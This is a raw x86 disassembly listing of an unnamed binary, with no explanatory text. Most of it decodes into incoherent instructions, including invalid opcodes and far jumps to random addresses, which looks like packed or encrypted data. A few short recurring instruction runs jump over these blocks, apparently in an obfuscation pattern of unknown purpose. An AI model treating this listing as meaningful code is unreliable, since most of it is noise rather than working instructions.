  407c4e:	sbb    cl,BYTE PTR [edi+0x12d412c0]
  407c54:	dec    esi
  407c55:	stc    
  407c56:	mov    dl,0xd3
  407c58:	sub    DWORD PTR [ebp+0x15],ebp
  407c5b:	pusha  
  407c5c:	sbb    dl,BYTE PTR [esi]
  407c5e:	jge    0x407c9f
  407c60:	rol    BYTE PTR [esp+ecx*4],cl
  407c63:	call   0xad65:0xd5b71af2
  407c6a:	int3   
  407c6b:	ss mov ebp,0x2ed8faf2
  407c71:	push   ds
  407c72:	mov    al,ds:0xeefda983
  407c77:	jecxz  0x407c66
  407c79:	(bad)  
  407c7a:	test   al,0xf5
  407c7c:	gs test al,0x69
  407c7f:	mov    eax,0xc414aa77
  407c84:	jp     0x407c41
  407c86:	imul   esp,DWORD PTR [edi+ecx*8-0x28ecdf34],0xffffffca
  407c8e:	iret   
  407c8f:	pop    esp
  407c90:	lock sub esi,DWORD PTR [ecx+eiz*1]
  407c94:	mov    esp,DWORD PTR ds:[edx+0x30]
  407c98:	call   0xf1dedbe6
  407c9d:	xchg   esp,eax
  407c9e:	shl    BYTE PTR [ebx+0x227abf34],cl
  407ca4:	push   ecx
  407ca5:	lods   al,BYTE PTR ds:[esi]
  407ca7:	fidiv  DWORD PTR [eax-0x41]
  407caa:	push   ebx
  407cab:	inc    ecx
  407cac:	sti    
  407cad:	xor    dx,ax
  407cb0:	xor    edi,eax
  407cb2:	add    edi,ecx
  407cb4:	add    edx,ecx
  407cb6:	imul   edx,edi
  407cb9:	mov    edi,DWORD PTR [ebp-0x8]
  407cbc:	mov    ebx,DWORD PTR [ebp-0x10]
  407cbf:	sub    ebx,edi
  407cc1:	cmp    ebx,edx
  407cc3:	jmp    0x407e74
  407cc8:	imul   esp,DWORD PTR [eax],0xfffffff2
  407ccb:	mov    cl,0x71
  407ccd:	jno    0x407d38
  407ccf:	loopne 0x407d06
  407cd1:	(bad)  
  407cd2:	cmp    bh,BYTE PTR [eax-0x1cdd39e8]
  407cd8:	test   edi,ecx
  407cda:	jle    0x407d5a
  407cdc:	mov    bh,BYTE PTR [edi+0x7e]
  407cdf:	jle    0x407c75
  407ce1:	pop    edx
  407ce2:	xchg   DWORD PTR [edx-0x79],edi
  407ce5:	inc    ebp
  407ce6:	mov    dh,0xe5
  407ce8:	or     BYTE PTR [edi+edx*8],0x5e
  407cec:	push   ds
  407ced:	fldcw  WORD PTR [edi+0x5e]
  407cf0:	icebp  
  407cf1:	push   ebx
  407cf2:	xchg   edi,eax
  407cf3:	ret    0xd34b
  407cf6:	push   edx
  407cf7:	sbb    eax,0x9cbcc07c
  407cfc:	stos   BYTE PTR es:[edi],al
  407cfd:	aad    0x83
  407cff:	jmp    0x407cfb
  407d01:	gs in  al,0x28
  407d04:	jmp    0xce05:0x4d6baac9
  407d0b:	cld    
  407d0c:	mov    ch,bl
  407d0e:	cld    
  407d0f:	jmp    0x52bdc96f
  407d14:	pusha  
  407d15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d16:	dec    ebx
  407d17:	not    ch
  407d19:	push   es
  407d1a:	test   DWORD PTR [ebp+0x3b],esi
  407d1d:	and    eax,0x7195e33b
  407d22:	sub    al,0x91
  407d24:	out    0x2e,eax
  407d26:	imul   edi,DWORD PTR [ecx+0x17],0x3e
  407d2a:	lea    eax,[edi]
  407d2c:	xchg   DWORD PTR [ebx],edx
  407d2e:	push   edx
  407d2f:	je     0x407daf
  407d31:	cmp    al,BYTE PTR [ebx+ecx*2]
  407d34:	popa   
  407d35:	popa   
  407d36:	or     dl,BYTE PTR [esi+0x3d]
  407d39:	mov    cl,0x6d
  407d3b:	cmp    DWORD PTR [eax],edx
  407d3d:	jmp    0xa43d:0x3a4eb94c
  407d44:	rcr    BYTE PTR [esi+0x4bb6ea9f],cl
  407d4a:	xchg   edi,eax
  407d4b:	pop    eax
  407d4c:	out    0xcd,al
  407d4e:	popf   
  407d4f:	sbb    DWORD PTR [edx],edi
  407d51:	pop    ds
  407d52:	addr16 pop ecx
  407d54:	adc    DWORD PTR [esi],ebx
  407d56:	pop    edx
  407d57:	mov    ds:0x4b71325b,al
  407d5c:	fs push ebx
  407d5e:	cmp    al,0xf1
  407d60:	jns    0x407ce5
  407d62:	pop    ebx
  407d63:	in     eax,0x2c
  407d65:	mov    cl,0xb6
  407d67:	in     al,0xe7
  407d69:	shl    BYTE PTR [edx-0x50],cl
  407d6c:	xchg   BYTE PTR [edx],bl
  407d6e:	sub    al,BYTE PTR [ecx+ebp*8+0x56b5a103]
  407d75:	ss xchg ebx,eax
  407d77:	mov    edx,0x75b52f84
  407d7c:	mov    cl,BYTE PTR [eax]
  407d7e:	jns    0x407dde
  407d80:	fsub   DWORD PTR [ebp+ebp*2+0x15]
  407d84:	and    ebp,DWORD PTR ds:0x16f0efd3
  407d8a:	ja     0x407d95
  407d8c:	push   edi
  407d8d:	sub    ecx,eax
  407d8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d90:	add    DWORD PTR [ebp+0x7039ae8],esp
  407d96:	pop    eax
  407d97:	imul   edx,DWORD PTR [ecx+0x45],0xb343340b
  407d9e:	int    0x39
  407da0:	out    0x1,eax
  407da2:	pop    es
  407da3:	mov    ah,0x86
  407da5:	test   eax,0xdd048057
  407daa:	dec    esp
  407dab:	mov    eax,ds:0x29707ba1
  407db0:	fimul  DWORD PTR [edi+0x31247d55]
  407db6:	out    0x64,eax
  407db8:	adc    esi,esp
  407dba:	ror    edi,cl
  407dbc:	push   edi
  407dbd:	adc    BYTE PTR [ecx],0xf2
  407dc0:	test   al,0x34
  407dc2:	lods   al,BYTE PTR ds:[esi]
  407dc3:	adc    dl,BYTE PTR [ebp-0xa]
  407dc6:	mov    ds:0x7ee2f2e9,eax
  407dcb:	xchg   DWORD PTR [eax+0x75],ecx
  407dce:	sbb    eax,0x9b3d0c16
  407dd3:	add    DWORD PTR [edi-0x61],edx
  407dd6:	push   cs
  407dd7:	lahf   
  407dd8:	repz jo 0x407e28
  407ddb:	dec    ecx
  407ddc:	xchg   edx,eax
  407ddd:	cs sub al,0xf4
  407de0:	ret    0x4c52
  407de3:	in     eax,0x94
  407de5:	mov    cl,0x3a
  407de7:	(bad)  
  407de8:	and    DWORD PTR [ecx+ebp*8+0x234e60e5],ecx
  407def:	mov    esp,0x8c0c6d42
  407df4:	arpl   cx,cx
  407df6:	xchg   esi,eax
  407df7:	dec    esp
  407df8:	sub    DWORD PTR [eax-0x68],ebp
  407dfb:	fdivrp st(5),st
  407dfd:	icebp  
  407dfe:	in     eax,dx
  407dff:	mov    edx,DWORD PTR [edi]
  407e01:	into   
  407e02:	sbb    bl,BYTE PTR [eax+ebx*2]
  407e05:	jg     0x407df7
  407e07:	dec    ecx
  407e08:	jg     0x407de0
  407e0a:	xchg   edx,eax
  407e0b:	fmul   DWORD PTR [edx-0x57c9bf46]
  407e11:	(bad)  
  407e12:	fnsave [ebp+esi*8-0x34]
  407e16:	mov    ecx,0x3b861496
  407e1b:	jnp    0x407e08
  407e1d:	aad    0xc9
  407e1f:	push   ds
  407e20:	mov    bl,0x48
  407e22:	ret    
  407e23:	adc    ah,BYTE PTR [ecx+0x3512945f]
  407e29:	xor    bl,BYTE PTR [edi-0x7842d631]
  407e2f:	mov    ebp,0xde5604d0
  407e34:	ror    DWORD PTR [ebx],1
  407e36:	inc    edx
  407e37:	jge    0x407dd5
  407e39:	cmp    BYTE PTR fs:[eax],bl
  407e3c:	adc    al,0x41
  407e3e:	mov    cl,0x9d
  407e40:	mov    esi,DWORD PTR [esi+0x1e0b6fc1]
  407e46:	repnz test eax,0x89674764
  407e4c:	and    BYTE PTR [edx+0x1b],al
  407e4f:	retf   
  407e50:	int3   
  407e51:	xchg   BYTE PTR [eax+0x47839d21],ah
  407e57:	je     0x407ddc
  407e59:	mov    ss,WORD PTR ds:0x8fa1e4d0
  407e5f:	xor    al,0x4d
  407e61:	jg     0x407e27
  407e63:	push   cs
  407e64:	ja     0x407ea4
  407e66:	jns    0x407eb7
  407e68:	push   edx
  407e69:	out    0xd6,al
  407e6b:	sbb    DWORD PTR [ebp-0x6fda108b],esi
  407e71:	out    dx,al
  407e72:	and    eax,0x8870fca
  407e77:	add    BYTE PTR [eax],al
  407e79:	add    BYTE PTR [ebx-0x11162bab],cl
  407e7f:	or     BYTE PTR [eax],al
  407e81:	add    BYTE PTR [ebx+0x7d8bcc55],cl
  407e87:	cld    
  407e88:	xor    edx,eax
  407e8a:	xor    edi,eax
  407e8c:	jmp    0x40803d
  407e91:	(bad)  
  407e92:	in     al,dx
  407e93:	test   eax,0x4771b1f1
  407e98:	call   0x1b74fcaf
  407e9d:	sub    BYTE PTR [ecx-0x5b],0xf9
  407ea1:	adc    ebp,ecx
  407ea3:	jle    0x407f23
  407ea5:	mov    bh,BYTE PTR [edi+0x7e]
  407ea8:	jle    0x407efb
  407eaa:	mov    edi,0xfc997935
  407eaf:	push   0xffffffb5
  407eb1:	sub    dl,BYTE PTR [edx+0x24f16e24]
  407eb7:	xor    eax,0x4e6c825
  407ebc:	xlat   BYTE PTR ds:[ebx]
  407ebd:	addr16 mov ss:0x93ae,eax
  407ec2:	jae    0x407f24
  407ec4:	and    eax,0x75e80b0d
  407ec9:	jp     0x407f08
  407ecb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ecc:	cdq    
  407ecd:	pop    ecx
  407ece:	xchg   esp,eax
  407ecf:	jmp    0x407e71
  407ed1:	sbb    al,0xb
  407ed3:	loope  0x407e83
  407ed5:	sahf   
  407ed6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ed8:	push   edi
  407ed9:	test   DWORD PTR [eax],0x2d60a627
  407edf:	jo     0x407eb6
  407ee1:	push   ebx
  407ee2:	fisubr DWORD PTR [esi+0x54]
  407ee5:	repz fcmovnbe st,st(5)
  407ee8:	test   eax,0x14e477db
  407eed:	mov    cl,BYTE PTR [esi-0x310ce436]
  407ef3:	ds or  esp,ebx
  407ef6:	ins    DWORD PTR es:[edi],dx
  407ef7:	dec    esi
  407ef8:	lds    edi,FWORD PTR [esi+0x70]
  407efb:	and    edx,DWORD PTR [edi+0x549048f7]
  407f01:	dec    ebx
  407f02:	xchg   ecx,eax
  407f03:	das    
  407f04:	fnstsw WORD PTR [ebp+0x15d132f3]
  407f0a:	sahf   
  407f0b:	rcl    DWORD PTR [ecx+0x50],1
  407f0e:	addr16 mov ebp,ecx
  407f11:	xchg   dh,ch
  407f13:	lea    edi,[eax+ecx*1-0x33]
  407f17:	add    edx,ebp
  407f19:	push   ss
  407f1a:	mov    al,0x4f
  407f1c:	gs push edi
  407f1e:	cmp    al,0x9e
  407f20:	push   edi
  407f21:	idiv   BYTE PTR [ebx-0x61f3baec]
  407f27:	ret    0xd8d7
  407f2a:	lahf   
  407f2b:	outs   dx,DWORD PTR ds:[esi]
  407f2c:	push   esi
  407f2d:	push   ebp
  407f2e:	hlt    
  407f2f:	mov    ?,WORD PTR [eax+0x632e5466]
  407f35:	dec    eax
  407f36:	outs   dx,DWORD PTR ds:[esi]
  407f37:	fwait
  407f38:	hlt    
  407f39:	bound  sp,DWORD PTR [ebp+0x6f]
  407f3d:	scas   eax,DWORD PTR es:[edi]
  407f3e:	inc    esi
  407f3f:	sbb    eax,0xc3b5e736
  407f44:	imul   esi,DWORD PTR [esi],0xa2c33237
  407f4a:	lods   eax,DWORD PTR ds:[esi]
  407f4b:	std    
  407f4c:	ret    0x4db8
  407f4f:	and    BYTE PTR [ecx+0x7f2f71c],dl
  407f55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f56:	test   BYTE PTR [edi+0x43],0xd6
  407f5a:	mov    al,ds:0xed31f336
  407f5f:	out    dx,eax
  407f60:	mov    ds:0xa6c00144,eax
  407f65:	xor    al,0x24
  407f67:	sbb    BYTE PTR [ebx-0xde67ebf],ch
  407f6d:	jnp    0x407f63
  407f6f:	xchg   ebp,eax
  407f70:	push   ebx
  407f71:	outs   dx,BYTE PTR ds:[esi]
  407f72:	sub    cl,dh
  407f74:	jno    0x407fc1
  407f76:	les    edx,FWORD PTR [ebp-0x40]
  407f79:	xchg   edx,eax
  407f7a:	mov    al,ds:0xa6160f0a
  407f7f:	sar    DWORD PTR [edi+ebp*1],1
  407f82:	jp     0x407f47
  407f84:	(bad)  
  407f85:	dec    edx
  407f86:	cmp    edx,DWORD PTR [edi-0x14ff4e49]
  407f8c:	cld    
  407f8d:	pop    esi
  407f8e:	call   0xb8ebd6ff
  407f93:	call   0x3a1d:0x47376dd
  407f9a:	lahf   
  407f9b:	leave  
  407f9c:	add    edx,edi
  407f9e:	push   0xffffffbb
  407fa0:	aas    
  407fa1:	aam    0x2f
  407fa3:	adc    al,0xc1
  407fa5:	stc    
  407fa6:	add    al,0x92
  407fa8:	inc    esp
  407fa9:	fucomi st,st(3)
  407fab:	mov    gs,WORD PTR [ecx]
  407fad:	popa   
  407fae:	lods   eax,DWORD PTR ds:[esi]
  407faf:	fbstp  TBYTE PTR [eax+0x6e6ada84]
  407fb5:	fild   WORD PTR [ecx+0x64925be9]
  407fbb:	(bad)
  407fbe:	push   0x14
  407fc0:	ret    
  407fc1:	xor    esp,DWORD PTR [esi+0x18]
  407fc4:	xlat   BYTE PTR ds:[ebx]
  407fc5:	popa   
  407fc6:	test   DWORD PTR [ebp-0x5b337e73],edi
  407fcc:	dec    ecx
  407fcd:	mul    DWORD PTR [ebx-0x5271be46]
  407fd3:	test   DWORD PTR [edi-0x54],eax
  407fd6:	loope  0x407fcf
  407fd8:	sub    bh,BYTE PTR [ebx]
  407fda:	mov    ah,0xf1
  407fdc:	nop
  407fdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fde:	mov    ebp,0x4b0baada
  407fe3:	nop
  407fe4:	adc    BYTE PTR ds:0xb79fe8d1,dl
  407fea:	fist   WORD PTR [eax]
  407fec:	push   ss
  407fed:	push   edi
  407fee:	cs addr16 dec edi
  407ff1:	adc    eax,0x659ca91d
  407ff6:	jo     0x407f95
  407ff8:	ficomp WORD PTR [ecx-0x79]
  407ffb:	sbb    al,0x77
  407ffd:	push   ss
  407ffe:	mov    dh,BYTE PTR [eax+edx*4-0x32790ba9]
  408005:	mov    dl,0xc0
  408007:	fmul   QWORD PTR [edi]
  408009:	and    al,0xb3
  40800b:	xchg   ebp,eax
  40800c:	sbb    eax,0x96c0f3b
  408011:	jle    0x407fa1
  408013:	jmp    0xfbbcc6cf
  408018:	jno    0x40806c
  40801a:	test   al,0xe0
  40801c:	fdivr  QWORD PTR [eax-0x81e49e]
  408022:	push   ebx
  408023:	adc    edi,DWORD PTR [esi+0x36]
  408026:	cmp    eax,0x2146e60a
  40802b:	adc    DWORD PTR [eax+0x3bc773e3],eax
  408031:	(bad)  
  408032:	rcr    BYTE PTR [ebx-0x16],1
  408035:	shr    DWORD PTR ds:0x31746ccb,cl
  40803b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40803c:	mov    ds:0xd103f903,al
  408041:	imul   edx,edi
  408044:	mov    edi,DWORD PTR [ebp-0x8]
  408047:	mov    ebx,DWORD PTR [ebp-0x10]
  40804a:	sub    ebx,edi
  40804c:	cmp    ebx,edx
  40804e:	ja     0x40805c
  408054:	mov    edx,DWORD PTR [ebp-0x30]
  408057:	jmp    0x408770
  40805c:	mov    edx,DWORD PTR [ebp-0x38]
  40805f:	mov    edi,DWORD PTR [ebp-0x4]
  408062:	xor    edx,eax
  408064:	xor    edi,eax
  408066:	add    edi,ecx
  408068:	jmp    0x408219
  40806d:	jmp    0x958e95d5
  408072:	push   0x185c6171
  408077:	mov    ch,0xe0
  408079:	gs stos BYTE PTR es:[edi],al
  40807b:	(bad)  
  40807c:	cmp    ch,BYTE PTR [ebp-0x75818136]
  408082:	jg     0x408102
  408084:	jle    0x408022
  408086:	(bad)  
  408087:	mov    ds:0xe6f9dcc3,al
  40808c:	fld    QWORD PTR ds:0x993d50ab
  408092:	jge    0x40802d
  408094:	and    ebx,DWORD PTR [esi]
  408096:	push   cs
  408097:	xlat   BYTE PTR ds:[ebx]
  408098:	loope  0x40809b
  40809a:	push   DWORD PTR [ebp+0x6170d941]
  4080a0:	xchg   esp,eax
  4080a1:	mov    ebx,0xf7119cb
  4080a6:	xor    eax,DWORD PTR [ebp+0x56c835c0]
  4080ac:	mov    ebx,0xc93571a7
  4080b1:	and    esp,ebp
  4080b3:	adc    edx,edx
  4080b5:	pop    edx
  4080b6:	pop    ebx
  4080b7:	sbb    DWORD PTR [ebp+0x6],eax
  4080ba:	mov    eax,ds:0x4cffbf02
  4080bf:	loop   0x408120
  4080c1:	mov    ecx,0x3c7beff4
  4080c6:	adc    ecx,DWORD PTR [ebx+0x4]
  4080c9:	std    
  4080ca:	jne    0x408141
  4080cc:	imul   edx,DWORD PTR [esi],0xfffffff1
  4080cf:	lock adc ah,ah
  4080d2:	icebp  
  4080d3:	add    bh,bl
  4080d5:	mov    eax,ds:0x1edfa005
  4080da:	add    ah,bh
  4080dc:	rcr    ecx,cl
  4080de:	mov    ecx,edi
  4080e0:	push   ebp
  4080e1:	add    ah,BYTE PTR [edi-0x2ed5dafb]
  4080e7:	jmp    0xe235:0xea1c661e
  4080ee:	rol    DWORD PTR [esi-0x6057defc],0xe9
  4080f5:	xor    bl,BYTE PTR [eax]
  4080f7:	in     al,0x83
  4080f9:	mov    DWORD PTR [esi-0x6d],ebx
  4080fc:	mov    edi,0x8b4aabbb
  408101:	sbb    eax,0xb08134c9
  408106:	sar    DWORD PTR [eax+ecx*4+0x4b],0x9c
  40810b:	sub    esp,DWORD PTR [edi-0x6154b41f]
  408111:	mov    dl,0xe3
  408113:	sbb    BYTE PTR [eax+edx*8],bl
  408116:	mov    al,ds:0x69522d29
  40811b:	sub    esi,DWORD PTR [ecx-0x4e0c9087]
  408121:	(bad)  
  408123:	cwde   
  408124:	pop    es
  408125:	je     0x4080e7
  408127:	xchg   edx,eax
  408128:	adc    BYTE PTR [ecx-0x64],0x4
  40812c:	sbb    BYTE PTR [edi-0x7b0d0b91],0xbd
  408133:	pusha  
  408134:	xor    al,0x82
  408136:	iret   
  408137:	mov    ds:0x70fbc51a,al
  40813c:	imul   esp,DWORD PTR [edx-0x6c],0x4c
  408140:	mov    bh,cl
  408142:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408143:	add    BYTE PTR [ebx+0x61],dl
  408146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408147:	popf   
  408148:	push   cs
  408149:	pop    esp
  40814a:	push   edi
  40814b:	call   0x9c4a5c0c
  408150:	push   ecx
  408151:	jp     0x408173
  408153:	(bad)  
  408154:	div    ebx
  408156:	jo     0x4081ab
  408158:	cli    
  408159:	push   ebp
  40815a:	jns    0x4080df
  40815c:	mov    eax,0x4d8a1381
  408161:	(bad)  
  408162:	jno    0x408198
  408164:	push   es
  408165:	xchg   ebx,eax
  408166:	pop    ebx
  408167:	cmp    DWORD PTR [ecx],eax
  408169:	out    dx,al
  40816a:	mov    edx,0xd0141826
  40816f:	mov    ch,ch
  408171:	jle    0x4081d2
  408173:	imul   ebx,esi,0x685b7f49
  408179:	fnstcw WORD PTR [ebp+edx*1-0x6c]
  40817d:	inc    ebp
  40817e:	xchg   ebx,eax
  40817f:	mov    edi,0x207497d2
  408184:	jns    0x4081c5
  408186:	jo     0x4081fb
  408188:	and    DWORD PTR [ebp-0x4f],esp
  40818b:	cld    
  40818c:	popa   
  40818d:	adc    BYTE PTR [esi],dl
  40818f:	aad    0x14
  408191:	cld    
  408192:	xlat   BYTE PTR ds:[ebx]
  408193:	fisubr DWORD PTR [esi+0x56508052]
  408199:	mov    ds:0x4f4287f2,al
  40819e:	mov    esp,esp
  4081a0:	rcr    dh,1
  4081a2:	xchg   ebp,eax
  4081a3:	test   BYTE PTR [esi+0x26c8ed93],ah
  4081a9:	cld    
  4081aa:	and    eax,0x4ca5d6f6
  4081af:	(bad)  
  4081b0:	nop
  4081b1:	pop    ebp
  4081b2:	sub    al,0xee
  4081b4:	(bad)  
  4081b5:	cli    
  4081b6:	iret   
  4081b7:	aam    0x45
  4081b9:	jl     0x408165
  4081bb:	popf   
  4081bc:	sub    DWORD PTR [edx],ebx
  4081be:	or     al,0x64
  4081c0:	sbb    BYTE PTR [esi-0x7f],ch
  4081c3:	sub    al,0x55
  4081c5:	jge    0x4081cb
  4081c7:	test   eax,0x64e14932
  4081cc:	push   es
  4081cd:	mov    dh,0x7
  4081cf:	or     BYTE PTR [esi-0x27b51d3e],0xf5
  4081d6:	push   edi
  4081d7:	adc    eax,0x6c157e42
  4081dc:	lahf   
  4081dd:	in     eax,0x3
  4081df:	repz push esi
  4081e1:	cdq    
  4081e2:	add    BYTE PTR [esi],dh
  4081e4:	arpl   WORD PTR [edi+0x6538515],cx
  4081ea:	sbb    BYTE PTR [esi*1+0x6d1e77cd],bh
  4081f1:	mov    eax,ds:0xb59ed03d
  4081f6:	cmp    eax,0xa842cc57
  4081fb:	adc    al,0x63
  4081fd:	cmc    
  4081fe:	repz inc ecx
  408200:	lock mov eax,ds:0x5c66a322
  408206:	in     eax,dx
  408207:	mov    dl,0xaf
  408209:	or     esp,ebx
  40820b:	scas   eax,DWORD PTR es:[edi]
  40820c:	cmp    BYTE PTR [ebx+0x4b],0x96
  408210:	push   eax
  408211:	dec    esp
  408212:	xor    al,0x1a
  408214:	mov    bl,0x50
  408216:	sbb    al,0x9
  408218:	push   cs
  408219:	add    edx,ecx
  40821b:	jmp    0x4083cc
  408220:	dec    esp
  408221:	adc    BYTE PTR [edi],bh
  408223:	add    eax,DWORD PTR [ebx-0x2f]
  408226:	push   eax
  408227:	push   ecx
  408228:	jl     0x4082a4
  40822a:	jmp    0x39b8:0x24388662
  408231:	enter  0x7e7e,0x8a
  408235:	jg     0x4082b5
  408237:	jle    0x4082b7
  408239:	loope  0x40826d
  40823b:	leave  
  40823c:	js     0x4081e7
  40823e:	add    cl,BYTE PTR [ecx+0x3b]
  408241:	jl     0x408283
  408243:	xchg   edx,eax
  408244:	pop    esi
  408245:	mov    al,ds:0xccd30013
  40824a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40824b:	sub    eax,0x84260cdf
  408250:	and    al,0x47
  408252:	xchg   edi,eax
  408253:	addr16 jno 0x4081d7
  408256:	adc    eax,0x5d205ed1
  40825b:	xchg   ebx,eax
  40825c:	sbb    eax,0x479dea06
  408262:	mov    al,0xa7
  408264:	cld    
  408265:	fadd   DWORD PTR [esi+0x3634d5d9]
  40826b:	xchg   esp,eax
  40826c:	adc    eax,0x182d2c82
  408271:	pop    edi
  408272:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408273:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408274:	dec    ebp
  408275:	(bad)  
  408277:	loopne 0x40825a
  408279:	addr16 inc esi
  40827b:	pop    ebp
  40827c:	push   ebx
  40827d:	sub    al,0xb4
  40827f:	aas    
  408280:	cli    
  408281:	nop
  408282:	or     ax,0xa646
  408286:	mov    edi,0x1346d587
  40828b:	mov    ecx,0xfc6b07a3
  408290:	jl     0x4082b3
  408292:	cld    
  408293:	add    ecx,DWORD PTR [ebx+0x23]
  408296:	cmp    al,BYTE PTR [edx-0x52f54f69]
  40829c:	xor    eax,0x5e80a7ba
  4082a1:	mov    dh,0x1a
  4082a3:	lahf   
  4082a4:	in     eax,0x19
  4082a6:	cld    
  4082a7:	add    eax,0x1ed70140
  4082ac:	bound  edi,QWORD PTR [esi+0x588c0418]
  4082b2:	dec    ebx
  4082b3:	and    eax,DWORD PTR [eax+0x46]
  4082b6:	ret    0x9b28
  4082b9:	in     al,0xae
  4082bb:	call   0xcade:0xfe6e321b
  4082c2:	cmc    
  4082c3:	jl     0x4082e3
  4082c5:	sbb    ch,BYTE PTR [ebx+0x3d]
  4082c8:	pusha  
  4082c9:	test   DWORD PTR ss:[eax-0x35d13eb7],0xbe221c78
  4082d4:	rcr    BYTE PTR [ebp-0x5],1
  4082d7:	cmp    al,0x52
  4082d9:	and    ecx,DWORD PTR [edi+eax*1-0x40a2a05d]
  4082e0:	or     BYTE PTR [esi],cl
  4082e2:	cmp    esp,DWORD PTR [edi-0x212618e9]
  4082e8:	mov    bl,0x37
  4082ea:	sti    
  4082eb:	mov    cl,0x82
  4082ed:	sbb    al,0xc0
  4082ef:	rol    DWORD PTR ds:0x99474731,1
  4082f5:	lea    eax,[ebp+0x4d6afe54]
  4082fb:	and    eax,0xf7ba11fd
  408300:	and    eax,0x2ba738aa
  408305:	addr16 mov ch,0x9d
  408308:	add    bh,BYTE PTR [edi-0x69840709]
  40830e:	jmp    DWORD PTR fs:[ecx+0x36391e37]
  408315:	mov    dl,ch
  408317:	xlat   BYTE PTR ds:[ebx]
  408318:	out    0x3d,al
  40831a:	mov    bl,0x24
  40831c:	add    DWORD PTR [ecx],ecx
  40831e:	and    eax,0xb2f83980
  408323:	lock imul ax,WORD PTR [ecx-0x58ac6bfd],0xffeb
  40832c:	cmp    eax,0xfc20eb8b
  408331:	mov    dh,0xad
  408333:	call   FWORD PTR [esi-0x6ac71a5d]
  408339:	mov    bh,0x8c
  40833b:	loope  0x40839e
  40833d:	inc    ebp
  40833e:	popf   
  40833f:	pop    edi
  408340:	(bad)
  408343:	lods   al,BYTE PTR ds:[esi]
  408344:	loope  0x40839b
  408346:	outs   dx,DWORD PTR ds:[esi]
  408347:	not    BYTE PTR [ebp+0x71e2e16b]
  40834d:	cwde   
  40834e:	push   ss
  40834f:	mov    ch,0xd5
  408351:	stos   DWORD PTR es:[edi],eax
  408352:	push   0xffffff96
  408354:	xchg   esi,eax
  408355:	or     ax,0xeda
  408359:	jbe    0x408385
  40835b:	jmp    FWORD PTR [ebp-0x4efff738]
  408361:	adc    al,0x96
  408363:	sbb    dl,BYTE PTR [ecx]
  408365:	test   ebp,0x34d5824d
  40836b:	or     eax,0x7f008b74
  408370:	xor    eax,0x1086abba
  408375:	std    
  408376:	out    0x77,al
  408378:	mov    edi,0x5c33d7a2
  40837d:	sub    ch,BYTE PTR [edx+0xd]
  408380:	mov    ah,0x60
  408382:	push   cs
  408383:	cmp    ecx,DWORD PTR [eax]
  408385:	cld    
  408386:	dec    edi
  408387:	mov    eax,0x52e62f59
  40838c:	add    al,0x9d
  40838e:	sub    ah,BYTE PTR [esi]
  408390:	int    0x9
  408392:	cmp    DWORD PTR [edi-0xc],0xcb281073
  408399:	test   eax,0xc4f20264
  40839e:	les    ebp,FWORD PTR [esi]
  4083a0:	shr    DWORD PTR [edx+esi*2+0x346de559],0xc5
  4083a8:	sbb    DWORD PTR [esi+0x23],esp
  4083ab:	xchg   ebx,eax
  4083ac:	cmp    DWORD PTR [ebp-0x61],ebx
  4083af:	inc    eax
  4083b0:	out    0xf3,eax
  4083b2:	or     BYTE PTR [edi],ah
  4083b4:	ds es gs adc eax,0xe69c36c8
  4083bc:	sub    BYTE PTR [ebx+0x6d],al
  4083bf:	push   cs
  4083c0:	mov    ah,0xab
  4083c2:	adc    al,0x4b
  4083c4:	cmc    
  4083c5:	add    edi,edi
  4083c7:	push   ebx
  4083c8:	sub    dl,BYTE PTR [edi]
  4083ca:	and    cl,BYTE PTR [edx]
  4083cc:	imul   edx,edi
  4083cf:	mov    edi,DWORD PTR [ebp-0x8]
  4083d2:	mov    ebx,DWORD PTR [ebp-0x10]
  4083d5:	sub    ebx,edi
  4083d7:	jmp    0x408588
  4083dc:	and    BYTE PTR [ebx-0x6c4aede2],ch
  4083e2:	xor    BYTE PTR [ecx-0x29441d92],ch
  4083e8:	sbb    cl,0x9f
  4083eb:	cwde   
  4083ec:	push   ebp
  4083ed:	leave  
  4083ee:	jle    0x40846e
  4083f0:	mov    bh,BYTE PTR [edi+0x7e]
  4083f3:	jle    0x408430
  4083f5:	mov    ss,WORD PTR [ecx+0x49]
  4083f8:	and    eax,0x7c67b749
  4083fd:	xor    al,0xd0
  4083ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408400:	and    DWORD PTR [ecx+0x431b7fb4],esi
  408406:	cmp    eax,0x8f9db540
  40840b:	pop    esp
  40840c:	fdivr  DWORD PTR [edx+edx*8-0x13]
  408410:	xor    eax,0x7755c19a
  408415:	or     dh,bh
  408417:	mov    ecx,0x5349bce5
  40841c:	xchg   cx,ax
  40841e:	xor    eax,0x979d8b8e
  408423:	cmc    
  408424:	xor    al,0x39
  408426:	push   ds
  408427:	jle    0x4083e2
  408429:	std    
  40842a:	mov    esi,0x64ffed1a
  40842f:	xor    cl,cl
  408431:	xor    dh,BYTE PTR [esp+edx*4-0x26b8d907]
  408438:	push   0x4c
  40843a:	or     ebx,eax
  40843c:	xchg   ebx,eax
  40843d:	cld    
  40843e:	inc    ecx
  40843f:	pop    esi
  408440:	ficomp DWORD PTR [eax-0x6be7c61f]
  408446:	out    dx,al
  408447:	std    
  408448:	and    cl,BYTE PTR [eax+eax*4+0x60]
  40844c:	mov    dl,BYTE PTR [edx]
  40844e:	mov    eax,0xe313a58c
  408453:	daa    
  408454:	xor    BYTE PTR ds:0x2bb7a4dd,cl
  40845a:	or     DWORD PTR [edx+0x5ae8c31],esi
  408460:	fs out dx,al
  408462:	or     cl,BYTE PTR [ebx+0x3afdb487]
  408468:	js     0x40842f
  40846a:	cwde   
  40846b:	mov    bl,0xf0
  40846d:	ja     0x4084e1
  40846f:	jle    0x4084d6
  408471:	or     ch,cl
  408473:	adc    eax,0xf33fa02d
  408478:	push   0xffffffec
  40847a:	push   esi
  40847b:	adc    al,0x2c
  40847d:	(bad)  
